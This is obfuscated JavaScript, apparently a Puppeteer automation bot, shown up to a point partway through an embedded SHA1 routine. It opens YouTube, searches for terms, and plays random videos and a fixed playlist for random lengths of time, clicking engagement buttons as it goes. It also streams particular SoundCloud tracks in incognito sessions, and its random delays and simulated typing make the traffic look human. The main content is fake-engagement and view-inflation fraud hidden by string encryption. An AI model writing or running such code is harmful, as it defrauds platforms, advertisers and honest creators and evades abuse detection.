const a0 = c,
  Z = b,
  Y = d;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x2 * 0x11d0 + -0x2 * -0x177 + -0x268d))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0xfc7 * 0x2 + 0x1349 + -0x32d7), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x76 * -0x1ae + 0x89ce + -0xdad2 + (0x3 * -0x1adb + -0x14bb * -0x3 + -0x1 * -0x4cf8) * random()) : await standardWaitForNetIdle(f), await wait(0x1 * -0x241d + 0x1487 + -0x1f * -0x122 + (-0x4918 + -0x13 * -0xe3 + 0x5f4f) * random()), -0xe5f + -0x1f27 + 0x2d87;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x1460 + 0x5ca + -0x1a2a);
    let h = e[f];
    if (c['CeGUQl'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x101 * 0x9 + -0x1dad + -0x4 * -0x529, r, s, t = -0x1 * -0x12aa + -0x1 * -0x108e + 0x2 * -0x119c; s = m['charAt'](t++); ~s && (r = q % (-0x1 * -0x26bf + 0x112 + 0x17 * -0x1bb) ? r * (0x316 + 0x1f53 + 0xa5 * -0x35) + s : s, q++ % (0x1e7c + -0xf49 + -0xf2f)) ? o += String['fromCharCode'](0x3d * 0x57 + 0x2293 + -0x1 * 0x364f & r >> (-(0x1 * -0x241d + 0x1487 + -0x4 * -0x3e6) * q & -0x248c + -0x3 * -0x2cf + 0x1c25)) : -0xe5f + -0x1f27 + 0x2d86) {
          s = n['indexOf'](s);
        }
        for (let u = -0x5d * -0x12 + -0x78e * -0x1 + -0xe18, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x9b9 * -0x1 + -0x11 * -0x35 + -0x322 * -0x2))['slice'](-(0x6 * -0x56d + -0x1faf * 0x1 + 0x403f * 0x1));
        }
        return decodeURIComponent(p);
      };
      c['bbuhKS'] = i, b = arguments, c['CeGUQl'] = !![];
    }
    const j = e[0x377 * -0x8 + -0x21bd + 0x1 * 0x3d75],
      k = f + j,
      l = b[k];
    return !l ? (h = c['bbuhKS'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function a() {
  const bn = [
    'finalized',
    'ExqTy29Yzs1PBq',
    'f3lcKSoycmkLvWpdTmk5',
    ',\x20\x22Chromiu',
    'lwHJyxb0y2HHlq',
    'evD9W7CdW5OOW70wpG',
    'eZn8AL5OFrykW7S',
    'W4qrW43dPdSVfWDlWOu',
    'ywXLEgv5lMLUAW',
    'trailers',
    'tcldLeudeCkL',
    'CMCVC2nYAxb0CW',
    'CSkysSkLW5W',
    'charCodeAt',
    'rc1jturzCMOZnq',
    'zgL1Bs5JB20Vqa',
    'Ata4Cu5TC3nyzq',
    'vdvqBJrmAeL3AG',
    'yMXVy2S',
    'Ahr0Chm6lY9NCG',
    'g-a59fdcb1',
    'ChrZlZiXmdeYlq',
    'axios'
  ];
  a = function() {
    return bn;
  };
  return a();
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x5d * -0x12 + -0x78e * -0x1 + 0x570), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x9b9 * -0x1 + -0x11 * -0x35 + -0xe3 * -0x7;
}
async function randomWait() {
  return await wait(0x6 * -0x56d + -0x1faf * 0x1 + 0x53c5 * 0x1 + (0x377 * -0x8 + -0x21bd + 0x1 * 0x50fd) * random()), 0xf29 * -0x2 + -0x1971 + 0x37c4;
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x1460 + 0x5ca + -0x1a2a);
    let h = e[f];
    if (b['TqnkoF'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x101 * 0x9 + -0x1dad + -0x4 * -0x529, s, t, u = -0x1 * -0x12aa + -0x1 * -0x108e + 0x2 * -0x119c; t = n['charAt'](u++); ~t && (s = r % (-0x1 * -0x26bf + 0x112 + 0x17 * -0x1bb) ? s * (0x316 + 0x1f53 + 0xa5 * -0x35) + t : t, r++ % (0x1e7c + -0xf49 + -0xf2f)) ? p += String['fromCharCode'](0x3d * 0x57 + 0x2293 + -0x1 * 0x364f & s >> (-(0x1 * -0x241d + 0x1487 + -0x4 * -0x3e6) * r & -0x248c + -0x3 * -0x2cf + 0x1c25)) : -0xe5f + -0x1f27 + 0x2d86) {
          t = o['indexOf'](t);
        }
        for (let v = -0x5d * -0x12 + -0x78e * -0x1 + -0xe18, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x9b9 * -0x1 + -0x11 * -0x35 + -0x322 * -0x2))['slice'](-(0x6 * -0x56d + -0x1faf * 0x1 + 0x403f * 0x1));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x377 * -0x8 + -0x21bd + 0x1 * 0x3d75,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0xf29 * -0x2 + -0x1971 + 0x37c3; u < 0x10 * 0x1a2 + -0x1cd2 + 0x3b2; u++) {
          p[u] = u;
        }
        for (u = -0x1 * 0x116f + -0x5 * -0x193 + 0x990; u < -0x1267 + 0xf8 * -0x1f + 0x316f * 0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0xd * -0x22f + -0x1 * 0xb10 + 0x817 * 0x5), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x1 * 0x2543 + -0x327 * -0x3 + -0xde7 * -0x2, q = -0x1621 + 0x79 * -0x9 + 0xb * 0x266;
        for (let v = -0xac1 * 0x1 + 0x1d85 + -0x12c4; v < n['length']; v++) {
          u = (u + (0x2076 + -0x4 * 0x2d5 + 0x1521 * -0x1)) % (0x2 * 0x178 + 0x8c * 0x7 + -0x4 * 0x171), q = (q + p[u]) % (-0x1 * -0x1b64 + 0x1 * -0x1d12 + 0x2ae), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x102a + -0x173c + 0x1 * 0x812)]);
        }
        return t;
      };
      b['abCqnw'] = m, c = arguments, b['TqnkoF'] = !![];
    }
    const j = e[0x95c + 0x43 * -0x81 + 0x1867],
      k = f + j,
      l = c[k];
    return !l ? (b['BbOeUf'] === undefined && (b['BbOeUf'] = !![]), h = b['abCqnw'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    const R = c;
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me'](R(0x1) + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x10 * 0x1a2 + -0x1cd2 + 0x2b2, -0x1 * 0x116f + -0x5 * -0x193 + 0x997), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0xdcd7 + 0x401 * -0x5a + 0x365f * 0xf) * getRandomInt(0xd * -0x22f + -0x1 * 0xb10 + 0x309 * 0xd, -0x1 * 0x2543 + -0x327 * -0x3 + -0x1a3 * -0x11), h)), -0x1621 + 0x79 * -0x9 + 0x7 * 0x3c5;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xac1 * 0x1 + 0x1d85 + -0x12c4;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x2076 + -0x4 * 0x2d5 + 0x1521 * -0x1]['split']('\x20');
    for (let k = 0x2 * 0x178 + 0x8c * 0x7 + -0x2 * 0x362; k < i['length']; k += -0x1 * -0x1b64 + 0x1 * -0x1d12 + 0x1b0)
      j += i[k] * h[i[k + (0x102a + -0x173c + 0x1 * 0x713)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x95c + 0x43 * -0x81 + 0x186d)['map'](l => Array['from'](l['children']))['flat'](0x1dc + -0x163 * -0x1a + -0x25e9)['map'](l => l['childNodes'][-0xa * 0x305 + -0xf8d + 0x2dc0]['childNodes'][0x2 * 0xe4b + 0x5 * -0x3f2 + -0x8dc]['childNodes'][0x1d75 + -0xc43 + -0x1131]['childNodes'][-0x2148 + 0x56 * -0x23 + 0x2d0a * 0x1]['childNodes'][0x18b0 + 0x4bd * -0x7 + 0x87c]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x1db8 + 0x2102 + -0x1 * -0x9e, -0x1f0c * -0x1 + 0x1533 + -0x20b7 * 0x1)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x54dc + -0x109 * 0x4d + 0x3571);
  const h = await getMaxTime(f),
    i = Math['min']((0xa * -0xe59 + 0x233 * -0xba + 0x312e8) * getRandomInt(0x1 * -0x1f23 + 0x1 * 0x1136 + 0x1d * 0x7b, -0x196 * -0x7 + 0x917 + -0x142c * 0x1), h);
  return await wait(i), -0x2 * -0x56c + -0x1 * 0x22d9 + 0xc01 * 0x2;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x834 + -0x2 * 0xb14 + 0x13 * 0xbc]['children'][0x1 * 0x1dc5 + 0x2543 + -0x4308]['children'][0x1946 + -0x1b0a + 0x1c4]['children'][-0x1487 * 0x1 + 0x5e6 * -0x1 + 0x1a6d]['children'][-0x2275 * -0x1 + -0xf9 + -0x217c * 0x1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x6 * 0x3b1 + -0x8f6 + 0x87 * 0x3b;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const S = b;
    let j = Array['from'](document['querySelec' + 'torAll'](S(0xa, '1kJa')));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1c5e + 0x43 * -0x13 + -0x97 * 0x27 + (0x6fe + -0xbe1 + 0x515 * 0x1) * random()
  }), await wait(-0x8d2 + 0xc * -0x26f + 0x2b * 0xee + (-0x111d * 0x1 + -0x3e4 + 0x162d) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1204 * -0x2 + 0x5 * 0x560 + -0x3ee6]['childNodes'][-0x1b9e + 0x1f * -0xad + 0x3092]['childNodes'][0x772 * 0x2 + 0xc0d * -0x2 + 0x937]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x21ee + -0x1a29 + 0x1 * -0x7c0]['childNodes'][0xd4 * 0x7 + -0x179 + -0x1b * 0x29]['childNodes'][0x150e + -0x230d + 0xe01]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0xa0e + -0x1d * 0x29 + 0xeb4),
          r = 0x13d7 * -0x1 + 0x8bf + -0x8e * -0x14;
        for (let u = -0x3 * -0x43 + 0x42e * 0x7 + -0x1e0b * 0x1; u < q['length']; u += 0x1de8 + -0x537 * 0x6 + -0x2 * -0xb2)
          r += q[u] * k[q[u + (-0x2 * 0xf16 + -0x7 * 0x346 + 0x1 * 0x3517)]];
        return r;
      }(n);
  });
  await wait((0x6742 + -0x1c5d * -0x1 + -0x4907) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x31 * 0x2a2 + -0x1 * -0x1409b + -0x1 * -0x2ac7) * getRandomInt(-0x1 * -0x25d6 + 0x1f83 + -0x2 * 0x22ac, 0x3ed * -0x1 + -0xd * 0x66 + 0x925), h + (-0x2 * -0xe5e + 0xeb6 + -0x2 * 0xbf5));
  return await wait(i), -0x7d * -0x28 + -0x5b5 + 0x3d * -0x3a;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1 * -0x4dc + 0x5b * 0x17 + -0x351), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2050 + 0xeed * 0x1 + -0x1 * -0x1d1b + (-0xca * 0x3 + 0x2 * -0xfee + 0x1 * 0x2622) * Math['random']());
    });
  }, -0x5 * 0x45d + -0x293 * -0x1 + 0x2e96);
  await wait(0x5 * -0xb022 + -0x172a7 + 0x1 * 0x97731);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1a213 + 0x401b * -0x5 + 0x2 * 0x446a) * getRandomInt(-0x16f7 + 0x19c6 * -0x1 + 0x30c1, -0x1 * -0x1a0 + -0x23f8 + -0x2271 * -0x1)), clearInterval(h), -0x1210 + -0xf55 + 0x2166;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x24b7 + 0x5b2 + -0x2a69;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x103 * 0x15 + 0x4 * 0x482 + -0x2 * 0x13a3;
    await randomWait();
  }
  return -0x13 * -0x19d + -0x2e1 * 0x7 + -0xa7f;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1 * 0x26ae + -0x1147 + -0x1 * 0x1567 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x1c03 * 0x1 + 0x272 * 0x4 + -0x25cb + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  const aO = {
    f: 0x2
  };
  async function i() {
    const T = b;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x2 * -0xbcc + -0x15b3 + 0x2d4b + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x257 * 0x1 + -0x1 * 0x1771 + 0x19c8;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x75 * -0x11f + -0xd2cc + 0x205bf + getRandomInt(0x995 * -0x5 + -0x2ba * 0x1b + 0xb41f, -0x299a * 0x3 + 0x1 * 0xa195 + 0x5069));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1e20 + -0x185b * -0x1 + -0x2 * -0x2e3), r = await f[T(aO.f, 'Hb#4') + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x13e8 + -0x11f * -0xe + 0x436;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x458 + -0x2500 + -0x62 * -0x6c, 0x1 * -0x236c + 0x6cc + 0x22 * 0xd9)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x1f72 + -0x53 * -0x22 + -0x70f * -0x4 + floor((0x469 * -0x2 + 0x1 * 0x1fd + 0xabd) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x7 * -0x1d73d312 + -0x5d70 * -0xd4e7 + -0x35b7 * 0x2e6e2),
          -0x844fca * 0x1 + -0x59d * 0x1921 + -0x1915e07 * -0x1,
          -0x629 * 0x14 + -0x11a5 * 0xa + 0x1aba6,
          0x1cbe + 0x6a3 * -0x4 + -0x1f * 0xe
        ], y = [
          0x9b * -0x3e + 0x1a07 + -0xb9b * -0x1,
          0x2275 * 0x1 + -0x5ed + -0x1c78,
          0xe7d + -0x16cd + 0x858,
          -0x1b7f + -0x562 + 0x20e1
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x3 * 0xa6 + -0x131b * -0x2 + -0x2827)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x14b2 + 0x16e5 * 0x1 + -0x233; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0x1ec7 + -0x1e17 + -0xb0) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const U = d;
              J ? (A[0xcc9 + -0x1987 + 0xcbe] = A[-0x1f35 + 0x1ef9 + 0x4c] = A[-0x119a + 0x23ec + -0x1251] = A[0x1376 + -0x100b + -0x369] = A[0xb * 0x36a + -0x3 * -0x7a2 + 0x3c71 * -0x1] = A[-0x1 * -0x1a6c + -0x15e7 + -0x481] = A[-0x24d0 + 0x1408 + -0x1 * -0x10cd] = A[-0x8a8 + -0x476 + -0x1 * -0xd24] = A[0x170c + -0xb * -0x371 + -0x8 * 0x79c] = A[0x158e + 0x2fe + -0x1884] = A[-0x1ac6 + 0x2644 + -0xb75] = A[0x80a + -0x1 * 0x2eb + -0x515 * 0x1] = A[-0x49 * -0x4b + 0x747 + -0x1c9f] = A[0x11fb * -0x1 + 0x2466 + -0x125f] = A[0x1 * 0x14a4 + 0x1a65 + -0x177e * 0x2] = A[-0x109e + -0x2 * -0x6c4 + -0x10c * -0x3] = A[0x1595 + -0x17ed + 0x267] = 0x1ad8 * -0x1 + 0x20b0 + 0x22 * -0x2c, this['blocks'] = A) : this['blocks'] = [
                0x1047 + -0xec0 + -0x187,
                -0x2605 + 0x890 + 0x1d75,
                0x2 * 0xa7 + 0x352 + 0x1 * -0x4a0,
                -0xefd + 0x1 * -0x222b + 0xc4a * 0x4,
                0x1b1c + -0x1367 * 0x1 + -0x1 * 0x7b5,
                0x4df + 0x247d + -0x4 * 0xa57,
                0x57 * -0x56 + 0x2166 + -0x42c,
                0x1c2b + -0x2575 * -0x1 + -0x41a0,
                -0x6b * 0x47 + -0xbf * 0x21 + 0x364c,
                0x8af + -0x1 * -0x1005 + -0x62d * 0x4,
                -0x1c4d + -0x1646 + 0x3293,
                0xe * 0x2a5 + -0x77c + -0x1d8a,
                -0x16d0 + -0x4f + 0x7b5 * 0x3,
                -0xb73 + -0x13 * -0x113 + 0x1 * -0x8f6,
                -0x8a7 * 0x1 + 0x1e4f + 0x16 * -0xfc,
                0x64d * -0x1 + -0x2063 + -0x26b0 * -0x1,
                -0xb2c + 0x2634 + -0x1b08
              ], this['h0'] = 0x33727a44 + 0x1 * -0xb0d13ac0 + 0xe4a3e37d, this['h1'] = -0x31890893 * 0x9 + 0x1 * -0xcbba0e9b + 0x37959074f, this['h2'] = -0x123341 * -0x4bd + 0x4729e17c + -0x1 * 0x4abdf7b, this['h3'] = 0x9356a29 * 0x1 + -0x71f622d * -0x3 + 0x2 * -0x7309e1d, this['h4'] = -0x16900333d + -0x21fe9 * 0xb801 + -0x12 * -0x34a75ef3, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1 * -0x3d9 + 0x66f * -0x1 + 0x296, this[U(0x0)] = this['hashed'] = 0x2 * 0x125f + -0x1d88 + -0x39b * 0x2, this['first'] = -0x1ee0 + 0x5 * 0x10d + 0xcd0 * 0x2;
            }
            ['update'](J) {
              const X = b,
                W = d,
                V = c;
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x1003 + 0x53 * -0x1 + -0xfb0, O = J['length'] || 0x97d * 0x1 + 0x6b9 * 0x5 + 0x6 * -0x72f, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1f7e * -0x1 + 0x449 * -0x3 + 0x2c59, P[0x15b5 + 0x15f7 + -0x2bac] = this[V(0x12)], P[0xc44 + 0x155f + -0x2193] = P[0x17 * -0xa3 + 0x29 * 0x2b + 0x7c3] = P[-0x19a * 0xf + -0x13b6 * -0x1 + -0x4f * -0xe] = P[0x2521 * -0x1 + -0x1c52 + 0x4176] = P[-0x12a2 + -0x169b + -0x1 * -0x2941] = P[0x7 * -0x3e5 + -0x265a + 0x41a2] = P[-0x17d * 0x6 + 0xf41 * 0x1 + -0x64d] = P[-0x1f4f + -0x6bf + 0x2615] = P[-0x1 * -0x6d0 + 0x2071 + -0x1 * 0x2739] = P[0x7f9 + 0x1 * 0x32f + -0x1 * 0xb1f] = P[-0x22be * -0x1 + 0x1f23 + -0x41d7 * 0x1] = P[-0x36 * -0xa5 + -0xb * -0x1c1 + -0x360e] = P[0x2 * 0x3f1 + -0x1c69 + 0x1493] = P[-0x4fd * 0x5 + -0x9dc * -0x1 + 0xf22] = P[-0x379 * 0x3 + -0x821 + 0x129a] = P[-0x1 * -0x1 + 0x36 * -0x9a + 0x208a] = 0x3 * 0x877 + -0x10d * -0x1a + -0xa8b * 0x5), K) {
                    for (N = this['start']; M < O && N < -0x575 * -0x1 + -0x5 * 0x3e6 + 0xe49; ++M)
                      P[N >> -0x2 * 0x596 + -0x1d25 + 0x2853] |= J[M] << y[0x5 * 0x466 + 0x7 * -0x513 + -0x2 * -0x6c5 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x11 * -0x23e + 0x18d3 + -0xd8b * -0x1; ++M)
                      (L = J[W(0xd)](M)) < 0x20dd * 0x1 + -0x61c + -0x263 * 0xb ? P[N >> -0x4 * -0x32a + 0x1ceb + -0x2991] |= L << y[-0x10 * -0x22f + -0x2241 + -0xac & N++] : L < -0x1 * 0x1cfa + 0x2 * -0x853 + -0xb * -0x4e0 ? (P[N >> -0xaef + -0x1 * 0x1113 + 0x1c04] |= (0xd2a + 0x2 * 0x32e + -0x216 * 0x9 | L >> 0xe4 * -0xe + 0x747 + -0x10b * -0x5) << y[-0x232 * -0xd + -0x1bc * 0x16 + 0x9a1 & N++], P[N >> -0x1b52 + 0x1d1 * -0x1 + 0x1d25] |= (-0xf18 + 0x11d7 * 0x2 + -0x1416 | -0x5b4 * 0x2 + -0x1e44 + 0x29eb & L) << y[-0x1 * -0x1a2d + -0x26d9 * -0x1 + -0x4103 & N++]) : L < -0xde7f + -0x11dcf + -0x45d * -0xa6 || L >= -0x20a1 * 0x5 + 0xa373 + 0xdfb2 ? (P[N >> 0x1a63 + -0x1df2 + 0x391 * 0x1] |= (-0xdcf * 0x2 + -0x31 * -0x32 + 0x12ec | L >> 0x1dc7 + 0x7 * -0x453 + 0x8a) << y[-0x1e86 + -0x835 + 0x26be & N++], P[N >> -0x1af7 + -0xaa * 0x1 + 0x1ba3 * 0x1] |= (0x73 * -0x29 + 0x1aef + -0x804 | L >> 0x1 * 0x1e3d + 0x7ce + -0x1 * 0x2605 & 0xd47 + -0x1cbd + -0xfb5 * -0x1) << y[0xe * 0x1bd + -0x1b5 * -0xb + -0x2b1a & N++], P[N >> 0x49 * 0x65 + 0xe01 + 0x1 * -0x2acc] |= (0x5 * 0x191 + 0x3b8 + -0x29 * 0x45 | 0x179c + 0x1 * 0x18ba + 0xd * -0x3b3 & L) << y[0xced + -0xc83 * -0x3 + -0x3273 & N++]) : (L = -0x517 * 0x13 + -0x92 * 0x305 + 0x1 * 0x3198f + ((-0x2408 + 0x85 * 0x13 + 0x1e28 & L) << 0x1b08 + -0x22fd * 0x1 + 0x7ff * 0x1 | -0x2561 + 0xb22 + 0x1e3e & J['charCodeAt'](++M)), P[N >> -0x14a4 + -0x503 * 